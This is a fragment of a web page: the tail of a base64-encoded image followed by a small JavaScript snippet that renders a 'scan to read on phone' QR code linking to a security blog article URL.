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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-AttachedHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 